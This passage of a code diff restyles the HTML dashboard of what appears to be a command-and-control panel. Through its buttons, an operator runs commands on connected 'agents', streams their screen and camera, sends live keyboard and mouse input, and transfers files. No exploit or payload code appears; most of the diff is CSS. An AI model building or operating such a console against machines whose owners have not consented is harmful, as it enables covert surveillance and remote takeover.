@@ -1177,23 +1177,28 @@ DASHBOARD_HTML = r'''
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Neural Control Hub</title>
-    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Inter:wght@300;400;500;600&display=swap" rel="stylesheet">
+    <title>Neural Control Hub - Dashboard</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
     <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.7.2/socket.io.js"></script>
     <style>
         :root {
-            --primary-bg: #0a0a0f;
-            --secondary-bg: #1a1a2e;
-            --tertiary-bg: #16213e;
-            --accent-blue: #00d4ff;
-            --accent-purple: #6c5ce7;
-            --accent-green: #00ff88;
-            --accent-red: #ff4757;
-            --text-primary: #ffffff;
-            --text-secondary: #a0a0a0;
-            --border-color: #2d3748;
-            --glass-bg: rgba(255, 255, 255, 0.05);
-            --glass-border: rgba(255, 255, 255, 0.1);
+            --primary-bg: #f8fafc;
+            --secondary-bg: #ffffff;
+            --tertiary-bg: #f1f5f9;
+            --accent-blue: #2563eb;
+            --accent-blue-dark: #1d4ed8;
+            --accent-green: #059669;
+            --accent-red: #dc2626;
+            --accent-orange: #ea580c;
+            --accent-yellow: #ca8a04;
+            --text-primary: #0f172a;
+            --text-secondary: #475569;
+            --text-muted: #64748b;
+            --border-color: #e2e8f0;
+            --border-light: #f1f5f9;
+            --shadow-sm: 0 1px 3px 0 rgb(0 0 0 / 0.1), 0 1px 2px -1px rgb(0 0 0 / 0.1);
+            --shadow-md: 0 4px 6px -1px rgb(0 0 0 / 0.1), 0 2px 4px -2px rgb(0 0 0 / 0.1);
+            --shadow-lg: 0 10px 15px -3px rgb(0 0 0 / 0.1), 0 4px 6px -4px rgb(0 0 0 / 0.1);
         }
 
         * {
@@ -1204,90 +1209,348 @@ DASHBOARD_HTML = r'''
 
         body {
             font-family: 'Inter', sans-serif;
-            background: linear-gradient(135deg, var(--primary-bg) 0%, var(--secondary-bg) 100%);
+            background: var(--primary-bg);
             color: var(--text-primary);
-            min-height: 100vh;
-            overflow-x: hidden;
+            height: 100vh;
+            overflow: hidden;
+            line-height: 1.5;
         }
 
-        .neural-bg {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: 
-                radial-gradient(circle at 20% 80%, rgba(0, 212, 255, 0.1) 0%, transparent 50%),
-                radial-gradient(circle at 80% 20%, rgba(108, 92, 231, 0.1) 0%, transparent 50%),
-                radial-gradient(circle at 40% 40%, rgba(0, 255, 136, 0.05) 0%, transparent 50%);
-            z-index: -1;
+        .dashboard-container {
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
         }
 
         .top-bar {
-            background: var(--glass-bg);
-            backdrop-filter: blur(20px);
-            border-bottom: 1px solid var(--glass-border);
-            padding: 15px 0;
-            position: sticky;
-            top: 0;
-            z-index: 100;
-        }
-
-        .top-bar-content {
-            max-width: 1400px;
-            margin: 0 auto;
-            padding: 0 20px;
+            background: var(--secondary-bg);
+            border-bottom: 1px solid var(--border-color);
+            padding: 12px 24px;
             display: flex;
             justify-content: space-between;
             align-items: center;
-        }
-
-        .header {
-            text-align: center;
-            margin-bottom: 30px;
-            padding: 20px 0;
+            box-shadow: var(--shadow-sm);
+            flex-shrink: 0;
         }
 
         .header h1 {
-            font-family: 'Orbitron', monospace;
-            font-size: 2.5rem;
-            font-weight: 900;
-            background: linear-gradient(45deg, var(--accent-blue), var(--accent-purple));
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            background-clip: text;
-            margin-bottom: 8px;
-            text-shadow: 0 0 30px rgba(0, 212, 255, 0.3);
+            font-size: 1.5rem;
+            font-weight: 600;
+            color: var(--text-primary);
         }
 
         .header .subtitle {
-            font-size: 1rem;
+            font-size: 0.875rem;
             color: var(--text-secondary);
-            font-weight: 300;
+            margin-top: 2px;
+        }
+
+        .user-controls {
+            display: flex;
+            gap: 12px;
+            align-items: center;
+        }
+
+        .main-content {
+            flex: 1;
+            display: grid;
+            grid-template-columns: 300px 1fr 300px;
+            grid-template-rows: 1fr;
+            gap: 16px;
+            padding: 16px;
+            overflow: hidden;
+        }
+
+        .sidebar {
+            background: var(--secondary-bg);
+            border-radius: 8px;
+            border: 1px solid var(--border-color);
+            box-shadow: var(--shadow-sm);
+            overflow: hidden;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .center-panel {
+            background: var(--secondary-bg);
+            border-radius: 8px;
+            border: 1px solid var(--border-color);
+            box-shadow: var(--shadow-sm);
+            overflow: hidden;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .panel-header {
+            background: var(--tertiary-bg);
+            padding: 12px 16px;
+            border-bottom: 1px solid var(--border-color);
+            font-weight: 600;
+            font-size: 0.875rem;
+            color: var(--text-primary);
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .panel-content {
+            flex: 1;
+            padding: 16px;
+            overflow-y: auto;
+        }
+
+        .agent-list {
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+        }
+
+        .agent-item {
+            padding: 12px;
+            background: var(--tertiary-bg);
+            border: 1px solid var(--border-color);
+            border-radius: 6px;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            font-size: 0.875rem;
+        }
+
+        .agent-item:hover {
+            background: var(--border-light);
+            border-color: var(--accent-blue);
+        }
+
+        .agent-item.selected {
+            background: var(--accent-blue);
+            color: white;
+            border-color: var(--accent-blue);
+        }
+
+        .agent-status {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin-bottom: 4px;
+        }
+
+        .status-indicator {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background: var(--accent-green);
+        }
+
+        .status-indicator.offline {
+            background: var(--accent-red);
+        }
+
+        .control-group {
+            margin-bottom: 16px;
+        }
+
+        .control-header {
+            font-weight: 600;
+            font-size: 0.875rem;
+            color: var(--text-primary);
+            margin-bottom: 8px;
+            padding-bottom: 4px;
+            border-bottom: 1px solid var(--border-light);
+        }
+
+        .btn {
+            background: var(--accent-blue);
+            color: white;
+            border: none;
+            padding: 8px 12px;
+            border-radius: 6px;
+            font-size: 0.875rem;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            margin-right: 8px;
+            margin-bottom: 8px;
+        }
+
+        .btn:hover {
+            background: var(--accent-blue-dark);
+            transform: translateY(-1px);
+        }
+
+        .btn-danger {
+            background: var(--accent-red);
+        }
+
+        .btn-danger:hover {
+            background: #b91c1c;
+        }
+
+        .btn-success {
+            background: var(--accent-green);
+        }
+
+        .btn-success:hover {
+            background: #047857;
+        }
+
+        .input-group {
+            display: flex;
+            gap: 8px;
+            margin-bottom: 8px;
+        }
+
+        .neural-input {
+            flex: 1;
+            padding: 8px 12px;
+            border: 1px solid var(--border-color);
+            border-radius: 6px;
+            font-size: 0.875rem;
+            background: var(--secondary-bg);
+        }
+
+        .neural-input:focus {
+            outline: none;
+            border-color: var(--accent-blue);
+            box-shadow: 0 0 0 3px rgba(37, 99, 235, 0.1);
+        }
+
+        .video-container {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 16px;
+            height: 100%;
+        }
+
+        .video-panel {
+            background: var(--tertiary-bg);
+            border-radius: 6px;
+            overflow: hidden;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .video-panel video {
+            width: 100%;
+            height: 200px;
+            object-fit: cover;
+            background: #000;
+        }
+
+        .video-controls {
+            padding: 12px;
+            display: flex;
+            gap: 8px;
+            flex-wrap: wrap;
+        }
+
+        .webrtc-panel {
+            background: var(--tertiary-bg);
+            border-radius: 6px;
+            overflow: hidden;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .webrtc-video {
+            width: 100%;
+            height: 200px;
+            object-fit: cover;
+            background: #000;
+        }
+
+        .webrtc-controls {
+            padding: 12px;
+            display: flex;
+            gap: 8px;
+            flex-wrap: wrap;
+        }
+
+        .status-display {
+            padding: 8px 12px;
+            background: var(--tertiary-bg);
+            border-radius: 6px;
+            font-size: 0.875rem;
+            color: var(--text-secondary);
+            margin-top: 8px;
+        }
+
+        .terminal {
+            background: #1e293b;
+            color: #e2e8f0;
+            padding: 12px;
+            border-radius: 6px;
+            font-family: 'Monaco', 'Menlo', 'Ubuntu Mono', monospace;
+            font-size: 0.875rem;
+            height: 200px;
+            overflow-y: auto;
+            white-space: pre-wrap;
+        }
+
+        .metrics-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 12px;
+        }
+
+        .metric-card {
+            background: var(--tertiary-bg);
+            padding: 12px;
+            border-radius: 6px;
+            border: 1px solid var(--border-color);
+        }
+
+        .metric-value {
+            font-size: 1.5rem;
+            font-weight: 600;
+            color: var(--accent-blue);
+        }
+
+        .metric-label {
+            font-size: 0.75rem;
+            color: var(--text-muted);
+            text-transform: uppercase;
+            letter-spacing: 0.05em;
         }
 
         .logout-btn {
-            background: linear-gradient(45deg, var(--accent-red), #ff6b7a);
-            border: none;
-            border-radius: 8px;
-            padding: 8px 16px;
+            background: var(--accent-red);
             color: white;
-            font-weight: 600;
+            border: none;
+            padding: 8px 16px;
+            border-radius: 6px;
+            font-size: 0.875rem;
+            font-weight: 500;
             cursor: pointer;
-            transition: all 0.3s ease;
             text-decoration: none;
-            font-size: 0.9rem;
+            display: inline-block;
         }
 
         .logout-btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 8px 25px rgba(255, 71, 87, 0.3);
+            background: #b91c1c;
+        }
+
+        .logout-btn {
+            background: var(--accent-red);
+            border: none;
+            border-radius: 6px;
+            padding: 8px 16px;
+            color: white;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            text-decoration: none;
+            font-size: 0.875rem;
+            box-shadow: var(--shadow-sm);
+        }
+
+        .logout-btn:hover {
+            background: #dc2626;
+            box-shadow: var(--shadow-md);
         }
 
         .container {
             max-width: 1400px;
             margin: 0 auto;
-            padding: 20px;
+            padding: 24px;
             position: relative;
             z-index: 1;
         }
@@ -1295,48 +1558,74 @@ DASHBOARD_HTML = r'''
         .main-grid {
             display: grid;
             grid-template-columns: 1fr 2fr;
-            gap: 25px;
-            margin-bottom: 25px;
+            gap: 24px;
+            margin-bottom: 24px;
+        }
+
+        .dashboard-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(400px, 1fr));
+            gap: 24px;
+            margin-top: 24px;
         }
 
         .panel {
-            background: var(--glass-bg);
-            backdrop-filter: blur(20px);
-            border: 1px solid var(--glass-border);
-            border-radius: 16px;
-            padding: 20px;
-            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
-            transition: all 0.3s ease;
+            background: var(--secondary-bg);
+            border: 1px solid var(--border-color);
+            border-radius: 12px;
+            padding: 24px;
+            box-shadow: var(--shadow-sm);
+            transition: all 0.2s ease;
+            position: relative;
+            overflow: hidden;
         }
 
         .panel:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 12px 48px rgba(0, 0, 0, 0.4);
+            box-shadow: var(--shadow-md);
+            border-color: var(--accent-blue);
+        }
+
+        .panel::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 3px;
+            background: var(--accent-blue);
+            opacity: 0;
+            transition: opacity 0.2s ease;
+        }
+
+        .panel:hover::before {
+            opacity: 1;
         }
 
         .panel-header {
             display: flex;
             align-items: center;
             margin-bottom: 20px;
-            padding-bottom: 15px;
-            border-bottom: 1px solid var(--border-color);
+            padding-bottom: 16px;
+            border-bottom: 1px solid var(--border-light);
         }
 
         .panel-icon {
-            width: 24px;
-            height: 24px;
+            width: 32px;
+            height: 32px;
             margin-right: 12px;
-            background: linear-gradient(45deg, var(--accent-blue), var(--accent-purple));
-            border-radius: 50%;
+            background: var(--accent-blue);
+            border-radius: 8px;
             display: flex;
             align-items: center;
             justify-content: center;
+            color: white;
+            font-size: 16px;
         }
 
         .panel-title {
-            font-family: 'Orbitron', monospace;
-            font-size: 1.2rem;
-            font-weight: 700;
+            font-family: 'Inter', sans-serif;
+            font-size: 1.125rem;
+            font-weight: 600;
             color: var(--text-primary);
         }
 
@@ -1348,135 +1637,146 @@ DASHBOARD_HTML = r'''
         }
 
         .agent-card {
-            background: var(--tertiary-bg);
+            background: var(--secondary-bg);
             border: 1px solid var(--border-color);
-            border-radius: 12px;
-            padding: 15px;
+            border-radius: 8px;
+            padding: 16px;
             cursor: pointer;
-            transition: all 0.3s ease;
+            transition: all 0.2s ease;
             position: relative;
+            border-left: 4px solid transparent;
         }
 
         .agent-card:hover {
             border-color: var(--accent-blue);
-            box-shadow: 0 4px 20px rgba(0, 212, 255, 0.2);
+            border-left-color: var(--accent-blue);
+            box-shadow: var(--shadow-md);
+            transform: translateY(-1px);
         }
 
         .agent-card.selected {
-            border-color: var(--accent-green);
-            background: rgba(0, 255, 136, 0.1);
-            box-shadow: 0 4px 20px rgba(0, 255, 136, 0.3);
+            border-color: var(--accent-blue);
+            border-left-color: var(--accent-blue);
+            background: rgba(59, 130, 246, 0.05);
+            box-shadow: var(--shadow-md);
         }
 
         .agent-status {
             position: absolute;
-            top: 10px;
-            right: 10px;
-            width: 10px;
-            height: 10px;
+            top: 12px;
+            right: 12px;
+            width: 8px;
+            height: 8px;
             border-radius: 50%;
             background: var(--accent-green);
-            box-shadow: 0 0 10px var(--accent-green);
-            animation: pulse 2s infinite;
-        }
-
-        @keyframes pulse {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.5; }
+            box-shadow: 0 0 0 2px rgba(16, 185, 129, 0.2);
         }
 
         .agent-id {
-            font-family: 'Orbitron', monospace;
+            font-family: 'Inter', sans-serif;
             font-weight: 600;
-            color: var(--accent-blue);
-            margin-bottom: 5px;
+            color: var(--text-primary);
+            margin-bottom: 6px;
+            font-size: 0.875rem;
         }
 
         .agent-info {
-            font-size: 0.9rem;
-            color: var(--text-secondary);
+            font-size: 0.75rem;
+            color: var(--text-muted);
         }
 
         .control-section {
             display: grid;
-            gap: 16px;
+            gap: 20px;
         }
 
         .control-group {
-            background: var(--tertiary-bg);
+            background: var(--secondary-bg);
             border: 1px solid var(--border-color);
-            border-radius: 12px;
-            padding: 16px;
-            transition: all 0.3s ease;
+            border-radius: 8px;
+            padding: 20px;
+            transition: all 0.2s ease;
+            position: relative;
         }
 
         .control-group:hover {
             border-color: var(--accent-blue);
-            box-shadow: 0 4px 20px rgba(0, 212, 255, 0.1);
+            box-shadow: var(--shadow-sm);
+            background: var(--tertiary-bg);
+        }
+
+        .control-group::after {
+            content: '';
+            position: absolute;
+            bottom: 0;
+            left: 20px;
+            right: 20px;
+            height: 1px;
+            background: var(--border-light);
         }
 
         .control-header {
-            font-family: 'Orbitron', monospace;
-            font-size: 1rem;
+            font-family: 'Inter', sans-serif;
+            font-size: 0.875rem;
             font-weight: 600;
-            color: var(--accent-blue);
-            margin-bottom: 15px;
+            color: var(--text-primary);
+            margin-bottom: 16px;
             text-transform: uppercase;
-            letter-spacing: 1px;
+            letter-spacing: 0.5px;
         }
 
         .input-group {
-            margin-bottom: 15px;
+            margin-bottom: 16px;
         }
 
         .input-label {
             display: block;
-            font-size: 0.9rem;
+            font-size: 0.875rem;
             color: var(--text-secondary);
-            margin-bottom: 8px;
+            margin-bottom: 6px;
             font-weight: 500;
         }
 
         .neural-input {
             width: 100%;
-            background: var(--tertiary-bg);
+            background: var(--secondary-bg);
             border: 1px solid var(--border-color);
-            border-radius: 8px;
-            padding: 12px 16px;
+            border-radius: 6px;
+            padding: 10px 12px;
             color: var(--text-primary);
-            font-size: 0.95rem;
-            transition: all 0.3s ease;
+            font-size: 0.875rem;
+            transition: all 0.2s ease;
         }
 
         .neural-input:focus {
             outline: none;
             border-color: var(--accent-blue);
-            box-shadow: 0 0 0 3px rgba(0, 212, 255, 0.1);
+            box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.1);
         }
 
         .neural-input[readonly] {
-            background: rgba(255, 255, 255, 0.05);
-            color: var(--text-secondary);
+            background: var(--tertiary-bg);
+            color: var(--text-muted);
         }
 
         .btn {
-            background: linear-gradient(45deg, var(--accent-blue), var(--accent-purple));
+            background: var(--accent-blue);
             border: none;
-            border-radius: 8px;
-            padding: 12px 24px;
+            border-radius: 6px;
+            padding: 10px 16px;
             color: white;
-            font-weight: 600;
+            font-weight: 500;
             cursor: pointer;
-            transition: all 0.3s ease;
-            margin-right: 10px;
-            margin-bottom: 10px;
-            position: relative;
-            overflow: hidden;
+            transition: all 0.2s ease;
+            margin-right: 8px;
+            margin-bottom: 8px;
+            font-size: 0.875rem;
+            box-shadow: var(--shadow-sm);
         }
 
         .btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 8px 25px rgba(0, 212, 255, 0.3);
+            background: #1e3a8a;
+            box-shadow: var(--shadow-md);
         }
 
         .btn:active {
@@ -1484,20 +1784,28 @@ DASHBOARD_HTML = r'''
         }
 
         .btn-danger {
-            background: linear-gradient(45deg, var(--accent-red), #ff6b7a);
+            background: var(--accent-red);
+        }
+
+        .btn-danger:hover {
+            background: #b91c1c;
         }
 
         .btn-success {
-            background: linear-gradient(45deg, var(--accent-green), #2ed573);
+            background: var(--accent-green);
+        }
+
+        .btn-success:hover {
+            background: #047857;
         }
 
         .output-terminal {
-            background: #000;
+            background: #1e293b;
             border: 1px solid var(--border-color);
-            border-radius: 10px;
+            border-radius: 8px;
             padding: 20px;
             font-family: 'Courier New', monospace;
-            color: var(--accent-green);
+            color: #10b981;
             min-height: 200px;
             max-height: 400px;
             overflow-y: auto;
@@ -1513,24 +1821,24 @@ DASHBOARD_HTML = r'''
         }
 
         .status-indicator {
-            padding: 8px 16px;
-            border-radius: 20px;
-            font-size: 0.85rem;
-            font-weight: 600;
-            margin-top: 10px;
+            padding: 8px 12px;
+            border-radius: 6px;
+            font-size: 0.875rem;
+            font-weight: 500;
+            margin-top: 12px;
             display: none;
         }
 
         .status-success {
-            background: rgba(0, 255, 136, 0.2);
+            background: rgba(16, 185, 129, 0.1);
             color: var(--accent-green);
-            border: 1px solid var(--accent-green);
+            border: 1px solid rgba(16, 185, 129, 0.2);
         }
 
         .status-error {
-            background: rgba(255, 71, 87, 0.2);
+            background: rgba(239, 68, 68, 0.1);
             color: var(--accent-red);
-            border: 1px solid var(--accent-red);
+            border: 1px solid rgba(239, 68, 68, 0.2);
         }
 
         .config-status {
@@ -1542,8 +1850,8 @@ DASHBOARD_HTML = r'''
             display: flex;
             justify-content: space-between;
             align-items: center;
-            padding: 8px 0;
-            border-bottom: 1px solid var(--border-color);
+            padding: 12px 0;
+            border-bottom: 1px solid var(--border-light);
         }
 
         .config-item:last-child {
@@ -1556,9 +1864,9 @@ DASHBOARD_HTML = r'''
         }
 
         .config-value {
-            font-family: 'Orbitron', monospace;
+            font-family: 'Inter', sans-serif;
             color: var(--accent-blue);
-            font-size: 0.9rem;
+            font-size: 0.875rem;
         }
 
         .password-management {
@@ -1622,6 +1930,161 @@ DASHBOARD_HTML = r'''
             background: var(--accent-purple);
         }
 
+        /* Video Panel Enhancements */
+        .video-panel {
+            background: var(--secondary-bg);
+            border: 1px solid var(--border-color);
+            border-radius: 12px;
+            padding: 24px;
+            box-shadow: var(--shadow-sm);
+            transition: all 0.2s ease;
+        }
+
+        .video-panel video {
+            border-radius: 8px;
+            box-shadow: var(--shadow-sm);
+        }
+
+        .webrtc-controls {
+            margin-bottom: 16px;
+            display: flex;
+            gap: 8px;
+            flex-wrap: wrap;
+        }
+
+        /* Status Enhancements */
+        .status-display {
+            background: var(--tertiary-bg);
+            border: 1px solid var(--border-color);
+            border-radius: 6px;
+            padding: 12px;
+            margin-top: 12px;
+            font-family: 'Courier New', monospace;
+            font-size: 0.875rem;
+        }
+
+        /* Enhanced Panel Styling */
+        .panel-header {
+            position: relative;
+        }
+
+        .panel-header::after {
+            content: '';
+            position: absolute;
+            bottom: -16px;
+            left: 0;
+            right: 0;
+            height: 1px;
+            background: var(--border-color);
+            opacity: 0.5;
+        }
+
+        /* Enhanced Button Styling */
+        .btn {
+            position: relative;
+            overflow: hidden;
+        }
+
+        .btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
+            transition: left 0.5s ease;
+        }
+
+        .btn:hover::before {
+            left: 100%;
+        }
+
+        /* Enhanced Input Styling */
+        .neural-input:focus {
+            transform: translateY(-1px);
+            box-shadow: 0 4px 12px rgba(59, 130, 246, 0.15);
+        }
+
+        /* Dashboard Grid Enhancements */
+        .dashboard-grid {
+            animation: fadeInUp 0.6s ease-out;
+        }
+
+        @keyframes fadeInUp {
+            from {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        /* Enhanced Visual Elements */
+        .panel-icon {
+            position: relative;
+        }
+
+        .panel-icon::after {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            width: 100%;
+            height: 100%;
+            background: var(--accent-blue);
+            border-radius: 8px;
+            opacity: 0.1;
+            transform: translate(-50%, -50%) scale(1.5);
+            z-index: -1;
+        }
+
+        /* Enhanced Control Groups */
+        .control-group {
+            position: relative;
+        }
+
+        .control-group::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 3px;
+            height: 100%;
+            background: var(--accent-blue);
+            border-radius: 0 2px 2px 0;
+            opacity: 0;
+            transition: opacity 0.2s ease;
+        }
+
+        .control-group:hover::before {
+            opacity: 1;
+        }
+
+        /* Enhanced Status Indicators */
+        .status-indicator {
+            position: relative;
+            overflow: hidden;
+        }
+
+        .status-indicator::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.1), transparent);
+            animation: shimmer 2s infinite;
+        }
+
+        @keyframes shimmer {
+            0% { left: -100%; }
+            100% { left: 100%; }
+        }
+
         /* Responsive Design */
         @media (max-width: 768px) {
             .main-grid {
@@ -1644,216 +2107,157 @@ DASHBOARD_HTML = r'''
     </style>
 </head>
 <body>
-    <div class="neural-bg"></div>
-    
-    <div class="top-bar">
-        <div class="top-bar-content">
+    <div class="dashboard-container">
+        <div class="top-bar">
             <div class="header">
-                <h1>NEURAL CONTROL HUB</h1>
-                <p class="subtitle">Advanced Command & Control Interface</p>
+                <h1>Neural Control Hub</h1>
+                <div class="subtitle">Advanced Command & Control Interface</div>
             </div>
-            <a href="/logout" class="logout-btn">Logout</a>
+            <div class="user-controls">
+                <a href="/logout" class="logout-btn">Logout</a>
+            </div>
         </div>
-    </div>
-    
-    <div class="container">
-        <div class="main-grid">
-            <!-- Agents Panel -->
-            <div class="panel">
+        
+        <div class="main-content">
+            <!-- Left Sidebar - Agents & Controls -->
+            <div class="sidebar">
                 <div class="panel-header">
-                    <div class="panel-icon">🔗</div>
-                    <div class="panel-title">Active Agents</div>
+                    <span>🔗</span>
+                    Active Agents
                 </div>
-                <div class="agent-grid" id="agent-list">
-                    <div class="no-agents">
-                        <div class="no-agents-icon">🤖</div>
-                        <div>No agents connected</div>
-                        <div style="font-size: 0.8rem; margin-top: 5px;">Waiting for neural links...</div>
+                <div class="panel-content">
+                    <div class="agent-list" id="agent-list">
+                        <div class="agent-item">
+                            <div class="agent-status">
+                                <div class="status-indicator offline"></div>
+                                <span>No agents connected</span>
+                            </div>
+                        </div>
                     </div>
-                </div>
-            </div>
-
-            <!-- Control Panel -->
-            <div class="panel">
-                <div class="panel-header">
-                    <div class="panel-icon">⚡</div>
-                    <div class="panel-title">Command Interface</div>
-                </div>
-                
-                <div class="control-section">
+                    
                     <div class="control-group">
                         <div class="control-header">Target Selection</div>
-                        <div class="input-group">
-                            <label class="input-label">Selected Agent</label>
-                            <input type="text" class="neural-input" id="agent-id" readonly placeholder="Select an agent from the left panel">
-                        </div>
+                        <input type="text" class="neural-input" id="agent-id" readonly placeholder="Select an agent">
                     </div>
-
+                    
                     <div class="control-group">
                         <div class="control-header">Command Execution</div>
-                        <div class="input-group">
-                            <label class="input-label">Command</label>
-                            <input type="text" class="neural-input" id="command" placeholder="Enter command to execute...">
-                        </div>
-                        <button class="btn" onclick="issueCommand()">Execute Command</button>
-                        <div id="command-status" class="status-indicator"></div>
+                        <input type="text" class="neural-input" id="command" placeholder="Enter command...">
+                        <button class="btn" onclick="issueCommand()">Execute</button>
                     </div>
-
+                    
                     <div class="control-group">
                         <div class="control-header">Quick Actions</div>
-                        <button class="btn" onclick="listProcesses()">List Processes</button>
-                        <button class="btn" onclick="startScreenStream()">Screen Stream</button>
-                        <button class="btn" onclick="startCameraStream()">Camera Stream</button>
-                        <button class="btn btn-danger" onclick="stopAllStreams()">Stop All Streams</button>
+                        <button class="btn" onclick="listProcesses()">Processes</button>
+                        <button class="btn" onclick="startScreenStream()">Screen</button>
+                        <button class="btn" onclick="startCameraStream()">Camera</button>
+                        <button class="btn btn-danger" onclick="stopAllStreams()">Stop All</button>
                     </div>
-
+                    
                     <div class="control-group">
-                        <div class="control-header">WebRTC Commands</div>
-                        <button class="btn btn-success" onclick="startWebRTCCommand()">Start WebRTC</button>
-                        <button class="btn btn-danger" onclick="stopWebRTCCommand()">Stop WebRTC</button>
-                        <button class="btn" onclick="getWebRTCStatsCommand()">Get Stats</button>
-                        <button class="btn" onclick="setWebRTCQuality()">Set Quality</button>
+                        <div class="control-header">Live Control</div>
+                        <div id="live-keyboard-input" tabindex="0" class="neural-input" style="height: 60px; resize: none;" placeholder="Live keyboard..."></div>
+                        <div id="live-mouse-area" style="width: 100%; height: 80px; border: 1px solid var(--border-color); background: var(--tertiary-bg); margin-top: 8px; border-radius: 6px;"></div>
                     </div>
-
-                    <div class="control-group">
-                        <div class="control-header">Live Keyboard</div>
-                        <div class="input-group">
-                            <label class="input-label">Press keys here to control the agent directly</label>
-                            <div id="live-keyboard-input" tabindex="0" class="neural-input" style="height: 100px; overflow-y: auto;" placeholder="Click here and start typing..."></div>
-                        </div>
-                    </div>
-                     <div class="control-group">
-                        <div class="control-header">Live Mouse Control</div>
-                        <div class="input-group">
-                            <label class="input-label">Control the agent's mouse here</label>
-                            <div id="live-mouse-area" style="width: 300px; height: 200px; border: 1px solid #ccc; position: relative; background: #222;"></div>
-                        </div>
-                        <div class="input-group">
-                            <label class="input-label">Mouse Button</label>
-                            <select id="mouse-button" class="neural-input">
-                                <option value="left">Left</option>
-                                <option value="right">Right</option>
-                            </select>
-                        </div>
-                    </div>
-
+                    
                     <div class="control-group">
                         <div class="control-header">File Transfer</div>
-                        <div class="input-group">
-                            <label class="input-label">Upload File to Agent</label>
-                            <input type="file" id="upload-file" class="neural-input">
-                        </div>
-                        <div class="input-group">
-                            <label class="input-label">Agent Destination Path (e.g., C:\Users\Public\file.txt)</label>
-                            <input type="text" id="agent-upload-path" class="neural-input" placeholder="Enter full path on agent...">
-                        </div>
-                        <button class="btn" onclick="uploadFile()">Upload</button>
-                        <div class="input-group" style="margin-top: 15px;">
-                            <label class="input-label">Download File from Agent</label>
-                            <input type="text" id="download-filename" class="neural-input" placeholder="Enter filename on agent...">
-                        </div>
-                        <div class="input-group">
-                            <label class="input-label">Save to Local Path (e.g., C:\Users\YourName\Downloads\file.txt)</label>
-                            <input type="text" id="local-download-path" class="neural-input" placeholder="Enter local path to save (e.g., C:\\Users\\YourName\\Downloads\\file.txt)">
-                        </div>
+                        <input type="file" id="file-upload" style="display: none;">
+                        <button class="btn" onclick="document.getElementById('file-upload').click()">Upload File</button>
+                        <input type="text" class="neural-input" id="download-path" placeholder="File path to download">
                         <button class="btn" onclick="downloadFile()">Download</button>
-                        <div id="file-transfer-status" class="status-indicator"></div>
+                    </div>
+                </div>
+            </div>
+            
+            <!-- Center Panel - Video Streams & WebRTC -->
+            <div class="center-panel">
+                <div class="panel-header">
+                    <span>📹</span>
+                    Live Streams
+                </div>
+                <div class="panel-content">
+                    <div class="video-container">
+                        <div class="video-panel">
+                            <video id="screen-video" autoplay muted></video>
+                            <div class="video-controls">
+                                <button class="btn btn-success" onclick="startScreenStream()">Start Screen</button>
+                                <button class="btn btn-danger" onclick="stopScreenStream()">Stop</button>
+                            </div>
+                        </div>
+                        
+                        <div class="video-panel">
+                            <video id="camera-video" autoplay muted></video>
+                            <div class="video-controls">
+                                <button class="btn btn-success" onclick="startCameraStream()">Start Camera</button>
+                                <button class="btn btn-danger" onclick="stopCameraStream()">Stop</button>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="webrtc-panel" style="margin-top: 16px;">
+                        <video id="webrtc-video" class="webrtc-video" autoplay muted></video>
+                        <div class="webrtc-controls">
+                            <button class="btn btn-success" onclick="startWebRTCStream()">Start WebRTC</button>
+                            <button class="btn btn-danger" onclick="stopWebRTCStream()">Stop WebRTC</button>
+                            <button class="btn" onclick="getWebRTCStats()">Get Stats</button>
+                            <button class="btn" onclick="setWebRTCQuality()">Set Quality</button>
+                        </div>
+                        <div id="webrtc-status" class="status-display" style="display:none;"></div>
+                    </div>
+                </div>
+            </div>
+            
+            <!-- Right Sidebar - Terminal & Metrics -->
+            <div class="sidebar">
+                <div class="panel-header">
+                    <span>📊</span>
+                    System Status
+                </div>
+                <div class="panel-content">
+                    <div class="metrics-grid">
+                        <div class="metric-card">
+                            <div class="metric-value" id="active-agents">0</div>
+                            <div class="metric-label">Active Agents</div>
+                        </div>
+                        <div class="metric-card">
+                            <div class="metric-value" id="total-commands">0</div>
+                            <div class="metric-label">Commands Executed</div>
+                        </div>
+                        <div class="metric-card">
